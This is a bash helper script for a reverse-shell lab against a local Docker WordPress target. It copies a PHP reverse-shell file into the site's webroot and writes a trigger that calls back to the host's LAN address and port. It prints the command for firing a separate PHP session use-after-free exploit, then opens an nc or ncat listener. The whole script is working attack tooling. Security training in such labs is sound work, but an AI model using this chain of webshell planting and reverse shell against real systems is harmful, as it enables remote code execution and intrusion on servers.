#!/usr/bin/env bash
# Reverse-shell lab helper for the WordPress target.
#
#   ./rev.sh              # default: listener on :4444
#   ./rev.sh 5555         # custom port
#
# Apple's bundled nc uses `nc -lvn 4444` because -p means "source port";
# This script detects which one is available.
set -u
cd "$(dirname "$0")" || exit 1

PORT="${1:-4444}"
EXP="$HOME/php2shell-lab/php-session-uaf/sessionshell.py"
URL="http://127.0.0.1:8091/"

# Docker Desktop does not route the bridge gateway to the host, so the
# callback must use the Mac's LAN address.
MACIP="$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)"
if [ -z "$MACIP" ]; then
  echo "[-] could not determine your Mac's LAN IP (en0/en1)."
  exit 1
fi
echo "[*] callback address: $MACIP:$PORT"

# Stage the trigger on the bind mount and wire it into the WordPress webroot.
mkdir -p out && chmod 777 out 2>/dev/null || true
cp assets/rev.php out/.rev.php
cat > out/r <<EOF
cp /out/.rev.php /var/www/html/r.php
chmod 644 /var/www/html/r.php
curl -s -m 20 "http://127.0.0.1/r.php?ip=$MACIP&port=$PORT" >/dev/null 2>&1 &
EOF
chmod 755 out/r

echo "[*] listener:"
if command -v ncat >/dev/null 2>&1; then
  echo "    ncat -lvnp $PORT"
elif nc -h 2>&1 | grep -q -- '--apple-recv-anyif'; then
  echo "    nc -lvn $PORT          # macOS nc (no -p; port is positional)"
else
  echo "    nc -lvnp $PORT"
fi
echo
echo "[*] fire in another terminal:"
echo "    cd ~/php2shell-lab/php-session-uaf"
echo "    python3 sessionshell.py -u $URL -c 'sh</out/r'"
echo

if command -v ncat >/dev/null 2>&1; then
  exec ncat -lvnp "$PORT"
elif nc -h 2>&1 | grep -q -- '--apple-recv-anyif'; then
  exec nc -lvn "$PORT"
else
  exec nc -lvnp "$PORT"
fi
